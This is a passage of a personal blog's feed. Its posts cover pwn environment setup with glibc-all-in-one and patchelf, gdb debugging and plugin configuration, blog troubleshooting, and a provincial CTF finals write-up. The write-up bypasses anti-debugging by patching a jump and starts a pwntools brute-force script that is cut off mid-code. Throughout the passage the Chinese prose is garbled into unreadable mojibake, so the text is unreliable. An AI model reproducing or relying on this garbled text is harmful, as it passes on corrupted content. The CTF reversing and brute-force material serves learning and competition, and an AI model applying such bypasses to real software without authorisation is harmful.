title="image-20240201215510938"><p>åé¢å‘ç°åªéœ€è¦ç»™å¯¹åº”æ–‡ä»¶å¤¹èµ‹äºˆå†™æƒé™å°±èƒ½ç›´æ¥å‘½ä»¤è¡Œä¸‹è½½è€Œä¸ç”¨æ‰‹åŠ¨å»å®˜ç½‘ä¸‹è½½äº†</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.freebuf.com/sectool/366854.html">https://www.freebuf.com/sectool/366854.html</a></p><p><a href="https://blog.csdn.net/weixin_49764009/article/details/124970461">ã€kaliã€‘ glibc-all-in-oneå®‰è£… ï¼ˆè§£å†³version <code>GLIBC_2.34â€˜ not foundï¼‰_version </code>glibc_2.34â€™ not found-CSDNåšå®¢</a></p><h1 id="ä¸åŒæƒ…å†µæ“ä½œ"><a href="#ä¸åŒæƒ…å†µæ“ä½œ" class="headerlink" title="ä¸åŒæƒ…å†µæ“ä½œ"></a>ä¸åŒæƒ…å†µæ“ä½œ</h1><p>libc-2.27.soï¼šå…·ä½“çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼Œç‰ˆæœ¬å·ä¸º2.27</p><p>libc.so.6ï¼šç¬¦å·é“¾æ¥ï¼ˆè½¯é“¾æ¥ï¼‰ï¼ŒæŒ‡å‘å½“å‰ç³»ç»Ÿé»˜è®¤çš„libcç‰ˆæœ¬ï¼Œä¾‹å¦‚å¯èƒ½æŒ‡å‘libc-2.27.so</p><p>lddï¼šæŸ¥çœ‹ç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨çš„libcåº“</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/1737789073794-be4d0115-81c4-4066-b018-a4f350597bc2.png" class="" title="img"><p>ç¬¬ä¸€è¡Œæ˜¯è™šæ‹Ÿsoæ–‡ä»¶,ç¬¬äºŒè¡Œæ˜¯libc,ç¬¬ä¸‰è¡Œæ˜¯ld ï¼Œldç”¨æ¥åŠ è½½åŠ¨æ€ç¨‹åº</p><h2 id="åªç»™libc-so-6"><a href="#åªç»™libc-so-6" class="headerlink" title="åªç»™libc.so.6"></a>åªç»™libc.so.6</h2><p>ç”¨strings libc.so.6 |grep Ubuntuæ¥ç¡®å®šéœ€è¦å®‰è£…çš„libcåº“</p><p><a href="https://j1ya-22.github.io/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215652930.png"><img src="/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/1707723607605-06870169-b0ab-4408-a977-c41095f6cb59.png" alt="img"></a></p><p>å…ˆæ›´æ–°listï¼šsudo .&#x2F;update_list</p><p>sudoä¸‹è½½</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/1737893606281-8a916766-2f5d-41b9-b916-aa3054ff15a3.png" class="" title="img"><p>åç»­æŒ‰æ•™ç¨‹é…ç½®å³å¯</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">patchelf --<span class="hljs-keyword">set</span>-interpreter /home/<span class="hljs-comment">kali</span>/Desktop/<span class="hljs-comment">glibc</span>/glibc-<span class="hljs-keyword">all</span>-in-one/<span class="hljs-comment">libs</span>/libc6_2<span class="hljs-number">.31</span><span class="hljs-number">-0</span>ubuntu9_amd64/<span class="hljs-comment">lib</span>/x86_64-linux-gnu/<span class="hljs-comment">ld-linux-x86-64.so.2 .</span>/fmt2<span class="hljs-number">.0</span><br>patchelf --set-rpath /<span class="hljs-comment">home</span>/kali/<span class="hljs-comment">Desktop</span>/glibc/<span class="hljs-comment">glibc-all-in-one</span>/libs/<span class="hljs-comment">libc6_2.31-0ubuntu9_amd64 .</span>/fmt2<span class="hljs-number">.0</span><br></code></pre></td></tr></table></figure><p><a href="https://j1ya-22.github.io/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215510938.png"><img src="/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/1707723651772-130aecae-17e7-4d9b-9eeb-79a418e0cb61.png" alt="img"></a></p><h2 id="åªç»™libc-2-27-so"><a href="#åªç»™libc-2-27-so" class="headerlink" title="åªç»™libc-2.27.so"></a>åªç»™libc-2.27.so</h2><p>å¯ä»¥ç›´æ¥ç”¨libc &#x3D; ELF(â€œ.&#x2F;libc-2.27.soâ€)åŠ è½½</p><p>patchelf â€“replace-needed libc.so.6 .&#x2F;libc-2.27.so pwn</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/1763124124778-bf2e9c87-a80b-4283-8847-b0b9d866f70b.png" class="" title="img"><h2 id="ç»™libcå’Œld"><a href="#ç»™libcå’Œld" class="headerlink" title="ç»™libcå’Œld"></a>ç»™libcå’Œld</h2><p>é€šè¿‡libc.so.6å¯ä»¥å¯»æ‰¾åˆ°å¯¹åº”çš„soæ–‡ä»¶ï¼Œæ— éœ€æ‰‹åŠ¨å¯»æ‰¾</p><p>patchelf â€“set-interpreter ld-linux-x86-64.so.2 .&#x2F;dialogue</p><p>patchelf â€“replace-needed libc.so.6 &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;System_not_found&#x2F;libc.so.6 .&#x2F;dialogue</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/1737789758936-5f76bede-d2b7-4026-9fa7-8b0fcadc918a.png" class="" title="img"><h2 id="stringså¾—åˆ°çš„ç‰ˆæœ¬ä¸listé‡Œçš„ä¸å¯¹åº”"><a href="#stringså¾—åˆ°çš„ç‰ˆæœ¬ä¸listé‡Œçš„ä¸å¯¹åº”" class="headerlink" title="stringså¾—åˆ°çš„ç‰ˆæœ¬ä¸listé‡Œçš„ä¸å¯¹åº”"></a>stringså¾—åˆ°çš„ç‰ˆæœ¬ä¸listé‡Œçš„ä¸å¯¹åº”</h2><p>ç»éªŒæ¥çœ‹2.31-0ubuntu9.9è¦ç”¨2.31-0ubuntu9.17ï¼Œä½†å…¶å®å°ç‰ˆæœ¬é—®é¢˜ä¸å¤§</p><p>ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢æ–¹æ³•æ‰¾åˆ°å‡†ç¡®çš„ç‰ˆæœ¬</p><p><a href="https://blog.csdn.net/XiDPPython/article/details/145126061">https://blog.csdn.net/XiDPPython/article/details/145126061</a></p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»¥ä¸€é“pwné¢˜å­¦ä¹ å¦‚ä½•åŠ¨è°ƒ</title>
    <link href="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/"/>
    <url>/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯0xGameçš„week2çš„ä¸€é“pwné¢˜ï¼Œé¢˜ç›®æœ¬èº«ä¸éš¾ï¼Œæœ‰ä¸€ä¸ªç–‘é—®ï¼Œåˆšå¥½å€Ÿæ­¤å·©å›ºäº†ä¸€ä¸‹pwnçš„åŠ¨è°ƒï¼Œå¸Œæœ›å¯ä»¥æœ‰æ‰€æ”¶è·</p><p><strong>ç›®æ ‡ï¼šå»çœ‹dword_40e0æ”¹å˜åçš„å€¼</strong></p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928256892-d5876add-9c6c-48f5-a51b-ec3c4a6ace91.png" class="" title="img"><p>ä¸€å¼€å§‹æ˜¯2ï¼Œmemsetèµ‹å€¼ä¸º0</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933587412-3d11e82a-c48c-48a4-91c9-c5d8ffea408e.png" class="" title="img"><p><strong>æŸ¥çœ‹å†…å­˜æ³¨æ„ä¸è¦åŠ *</strong></p><p>å› ä¸ºæ˜¯å°ç«¯åºï¼Œçº¢è‰²æ¡†èµ·æ¥çš„éƒ¨åˆ†æ˜¯shopping_cart[0]</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696931566289-5ff15310-4891-45fc-a21c-36b568debc5f.png" class="" title="img"><p>çœ‹åŸºå€</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928301743-312c76ab-6eda-4690-beb0-643c5b194883.png" class="" title="img"><p><strong>åŠ åç§»åå¾—åˆ°çœŸå®åœ°å€</strong></p><p>åœ¨ä¸¤æ¬¡scanfä¹‹é—´ä¸‹æ–­ç‚¹</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933156497-0828eea7-53fe-441e-8643-1c57ec02a3aa.png" class="" title="img"><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933120221-449859d4-9339-433c-8c6c-2095728035b8.png" class="" title="img"><p>æœ‰æ–­ç‚¹æ‰€ä»¥ä¼šåœä¸‹æ¥</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933208375-7fd26797-e85b-434c-82a5-444f7d6dc676.png" class="" title="img"><p>å•æ­¥æ­¥è¿‡è‡³0x5555555555452(è¶…è¿‡544fï¼‰</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933320205-b8f8d425-ff15-4ad5-96c4-fb5f81598879.png" class="" title="img"><p>å†çœ‹å†…å­˜å°±å‘ç°å˜äº†</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933006068-cde05956-be30-4e84-bbb3-8faaab80f643.png" class="" title="img"><p>ç”¨wæŸ¥çœ‹å†…å­˜å°±å¯ä»¥é¿å…ç«¯åºé—®é¢˜</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933427059-5ce862e5-b191-4be7-9378-2d1622ea0353.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­å»ºåšå®¢æ—¶ä¸ªäººé‡åˆ°çš„ä¸€äº›é—®é¢˜</title>
    <link href="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <url>/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€äº›ä¸æ—¶ä¿±è¿›çš„é—®é¢˜ï¼ˆå› ä¸ºç½‘ä¸Šçš„æ•™ç¨‹å¤§éƒ½æ˜¯ä¸‰å››å¹´å‰çš„äº†ï¼‰å’Œä¸ªäººçš„ä¸€äº›éé¢„æœŸåšæ³•</p><h1 id="æœ¬åœ°åšå®¢æ˜ å°„åˆ°github"><a href="#æœ¬åœ°åšå®¢æ˜ å°„åˆ°github" class="headerlink" title="æœ¬åœ°åšå®¢æ˜ å°„åˆ°github"></a>æœ¬åœ°åšå®¢æ˜ å°„åˆ°github</h1><p>æ‰§è¡Œ<code>hexo clean&amp;hexo g -d</code>åä¼šæœ‰åƒä¸‹é¢ä¸€æ ·æ—¶ä¸æ—¶åœ°æŠ¥é”™ï¼Œç½‘ä¸Šçš„ä¸æ˜¯å¾ˆè¡Œï¼Œæˆ‘è¿™é‡ŒæŠŠgithubåæ”¹æˆå’Œåšå®¢åä¸€æ ·å°±è¡Œäº†</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/1.png" class="" title="image-20240114211559597"><p>ç›®å‰æˆ‘çš„githubæ˜¯è¿™ä¹ˆä¸ªé¡µé¢</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212817973.png" class="" title="image-20240114212817973"><h1 id="ç»Ÿè®¡è®¿é—®é‡"><a href="#ç»Ÿè®¡è®¿é—®é‡" class="headerlink" title="ç»Ÿè®¡è®¿é—®é‡"></a>ç»Ÿè®¡è®¿é—®é‡</h1><p>æŒ‰æ•™ç¨‹ç”¨leancloudç»Ÿè®¡è®¿é—®é‡ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ¬åœ°èƒ½çœ‹åˆ°ä½†æ˜¯è¿œç¨‹ä¸€ç›´çœ‹ä¸åˆ°ï¼Œè¯•äº†busuanziå‘ç°ä¹Ÿå·®ä¸å¤š</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212107890.png" class="" title="image-20240114212107890"><h1 id="æ·»åŠ å›¾ç‰‡"><a href="#æ·»åŠ å›¾ç‰‡" class="headerlink" title="æ·»åŠ å›¾ç‰‡"></a>æ·»åŠ å›¾ç‰‡</h1><p><a href="https://zhuanlan.zhihu.com/p/280758822#:~:text=hexo%E5%8D%9A%E5%AE%A2%E6%98%BE%E7%A4%BAmarkdown%E8%B7%AF%E5%BE%84%E7%9A%84%E5%9B%BE%E7%89%87%201%20%E4%BF%AE%E6%94%B9%20_config.yml%20%E4%B8%AD%E7%9A%84%20post_asset_folder%3A%20true%202,install%20hexo-image-link%20--save%204%20%E4%BF%AE%E6%94%B9md%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%20%21%20%5Blabel%5D%20%28markdown-file-name%2Fimage-name.jpg%29">hexoåšå®¢æ˜¾ç¤ºmarkdownè·¯å¾„çš„å›¾ç‰‡ - çŸ¥ä¹ (zhihu.com)</a></p><p>æˆ‘æ²¡æœ‰ç”¨æ•™ç¨‹ç»™çš„æ–¹æ³•ï¼Œè€Œæ˜¯è‡ªå·±æ‰¾äº†ä¸€ä¸ªï¼ŒæŠŠå›¾ç‰‡ç›´æ¥å¤åˆ¶åˆ°æ–‡æ¡£é‡Œï¼Œmarkdownå’Œåšå®¢éƒ½èƒ½ç›´æ¥çœ‹åˆ°å›¾ç‰‡ï¼Œç®€æ´æ˜äº†</p><p>æ€»ç»“æ¥è¯´ï¼Œæœ€åèƒ½æˆåŠŸè¿˜æ˜¯æ»¡æ„çš„ï¼Œè¿˜æ˜¯è¦è‡ªå·±å¤šå®è·µï¼ŒåŸ¹å…»ç‹¬ç«‹è§£å†³é—®é¢˜çš„èƒ½åŠ›</p><p>æ€»çš„å‚è€ƒæ•™ç¨‹é™„ä¸Šï¼š<a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnè°ƒè¯•æ’ä»¶çš„å®‰è£…ä¸ä½¿ç”¨</title>
    <link href="/2023/12/15/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/12/15/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>å¯¹åº”å¯åŠ¨å‘½ä»¤ï¼š</p><p>echo â€œsource ~&#x2F;GdbPlugins&#x2F;peda&#x2F;peda.pyâ€ &gt; ~&#x2F;.gdbinit </p><p>echo â€œsource ~&#x2F;GdbPlugins&#x2F;gef&#x2F;gef.pyâ€ &gt; ~&#x2F;.gdbinit </p><p>echo â€œsource ~&#x2F;GdbPlugins&#x2F;gdbinit&#x2F;gdbinitâ€ &gt; ~&#x2F;.gdbinit </p><p>echo â€œsource ~&#x2F;GdbPlugins&#x2F;pwndbg&#x2F;gdbinit.pyâ€ &gt; ~&#x2F;.gdbinit</p><p>written in 2024.3.27</p><p>ä»Šå¤©åœ¨ç”¨pwndbgè°ƒè¯•çš„æ—¶å€™å‘ç°ç”¨ä¸äº†fmtarg</p><img src="/2023/12/15/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545503373-5e3c9f65-a0d7-4b95-88cc-61ad03f8b8aa.png" class="" title="img"><p>åœ¨å¸ˆå‚…çš„æé†’ä¸‹å‘ç°æ²¡è£…pwngdb</p><p>å®‰è£…æ•™ç¨‹å¾ˆå¥½æ‰¾</p><p><a href="https://hgg-bat.github.io/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#%E5%AE%89%E8%A3%85pwndbg-pwngdb-%E8%81%94%E5%90%88%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83">https://hgg-bat.github.io/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#%E5%AE%89%E8%A3%85pwndbg-pwngdb-%E8%81%94%E5%90%88%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83</a></p><p>ç„¶è€Œè¿™ä¸ªæ—¶å€™å˜æˆäº†pedaæ’ä»¶<img src="/2023/12/15/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545652379-1c7edc3f-c6d7-4890-a057-9b927d6b189d.png" class="" title="img"></p><p>æ˜¾ç„¶æˆ‘ä¸çˆ½</p><img src="/2023/12/15/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545638070-e9e6bdb4-90b0-41df-9d76-02738751b58f.png" class="" title="img"><p>äºæ˜¯æŠŠpedaè¿™è¡Œæ³¨é‡Šæ‰ï¼Œå†å†™å¯¹pwndbgä¸­gdbinit.pyçš„è·¯å¾„åï¼ˆåŸæ¥æ²¡æœ‰GdbPluginsï¼Œè¿™æ˜¯æˆ‘è‡ªå·±çš„è·¯å¾„ï¼‰ï¼Œå‘ç°è¾¾åˆ°ç›®çš„äº†ï¼Œä¹Ÿå°±æ˜¯ç¬¬å››è¡Œä»£ç æ²¡ç”¨</p><img src="/2023/12/15/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545436991-0789d3dc-7355-41e5-adb2-33562cc14b2e.png" class="" title="img"><p>è¿˜æ˜¯å¾ˆæ„Ÿè°¢æˆé•¿è¿‡ç¨‹ä¸­çš„å„ä½å¸ˆå‚…(âÂ´â—¡&#96;â)</p><img src="/2023/12/15/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545974939-334d1a9c-10ae-4b8f-8d57-3d61363f671a.png" class="" title="img"><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/aoxixi/article/details/90142736">https://blog.csdn.net/aoxixi/article/details/90142736</a></p>]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµ™æ±Ÿçœçœèµ›2023å†³èµ›wp</title>
    <link href="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/"/>
    <url>/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯å¤ªèœäº†ï¼Œé˜Ÿå‹æŠ¬åˆ°äºŒç­‰å¥–ï¼Œçœ‹åˆ°å¥½å¤šä¸ä¼šçš„ï¼Œè¿˜å¾—åŠ æ²¹</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ida-pro"><a href="#ida-pro" class="headerlink" title="ida_pro"></a>ida_pro</h2><p>æœ‰å£³ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è„±å£³ï¼Œçœ‹äº†ä¸€ä¸‹å‘ç°æ˜¯è¢«modified</p><p>åˆå‘ç°PEèŠ‚è¢«æ”¹äº†ï¼Œé‚£å°±æ”¹å›æ¥ï¼ŒæŠŠOæ”¹æˆUï¼Œç„¶åå†å»è„±å£³</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699706755416-69ff9169-671e-489d-b4ca-2b3502e5476b.png" class="" title="img"><p>çœ‹ä¼ªcï¼Œflagç”±4éƒ¨åˆ†ç»„æˆ</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699706934797-bdb62d29-76b7-4079-98ca-521c49e53051.png" class="" title="img"><p>ç¬¬ä¸€éƒ¨åˆ†shift+f12</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699706986919-005de297-8113-4547-ad7c-82dec78e81a9.png" class="" title="img"><p>ç¬¬äºŒéƒ¨åˆ†çœ‹å‡½æ•°å</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699707011688-db1d17ba-50f1-4d73-91e6-bba571173ab5.png" class="" title="img"><p>ç¬¬ä¸‰éƒ¨åˆ†æ˜¯Xrefï¼Œä¸€å¼€å§‹æ–­ç½‘æ²¡æƒ³èµ·æ¥ï¼Œåæ¥æ‰æƒ³åˆ°æ˜¯äº¤å‰å¼•ç”¨</p><p>æ¯”èµ›çš„æ—¶å€™çœ‹æ±‡ç¼–çœ‹ç€çœ‹ç€å°±å‡ºäº†ï¼Œå…¶å®æ˜¯æ‰¾ç¬¬ä¸€ä¸ªå­—ä¸²</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699707087398-c681109b-7de7-4045-8004-48b0f4e04429.png" class="" title="img"><p>äº¤å‰å¼•ç”¨è¿‡å»</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699707116570-b7e5ebff-6d06-42b2-ae3f-227fdee10cb0.png" class="" title="img"><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699707128382-8bfa8b4b-deb8-4a89-90ca-a9d77d3fced8.png" class="" title="img"><p>æ•°å­—è½¬ascii</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699707200114-896a274e-3983-4a36-9635-e89ee27c9c8a.png" class="" title="img"><p>è¿èµ·æ¥ï¼Œæ³¨æ„ä¸€äºŒä¸¤éƒ¨åˆ†çœ‹ä¼¼æœ‰ä¸¤æ ¹ä¸‹åˆ’çº¿ï¼Œå®é™…ä¸Šåªæœ‰ä¸€æ ¹ï¼Œä¸¤æ ¹ä¹Ÿä¸ç¬¦åˆå¸¸ç†</p><h2 id="Ez8or-1"><a href="#Ez8or-1" class="headerlink" title="Ez8or-1"></a>Ez8or-1</h2><p>æœ‰åè°ƒè¯•</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699948300084-3305eb64-7290-435b-81b4-4674e7fef634.png" class="" title="img"><p>å¯ä»¥jnzæ”¹jmpå¼ºåˆ¶è·³è½¬ï¼Œä¹Ÿå¯ä»¥è¿è¡Œå®Œcmpä¹‹åä¿®æ”¹ZFçš„å€¼ï¼Œæœ€ç»ˆç»•è¿‡åè°ƒè¯•</p><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699948320463-aa775a22-8603-4873-8f6c-fcd0add24191.png" class="" title="img"><img src="/2023/11/13/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%86%B3%E8%B5%9Bwp/1699948487227-69a1882b-4cf2-40ef-a127-f2a6d02c0f4b.png" class="" title="img"><p>è¿™é¢˜å› ä¸ºæ¯”è¾ƒçš„é•¿åº¦æ˜¯è¾“å…¥çš„é•¿åº¦ï¼Œå¹¶ä¸æ˜¯å›ºå®šçš„60ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨çˆ†ç ´çš„å½¢å¼ï¼Œä¸”æ˜¯elfï¼Œç”¨pwnçš„æ–¹å¼çˆ†ç ´æ›´å¿«</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>filename = <span class="hljs-string">&#x27;./Ez8or&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) 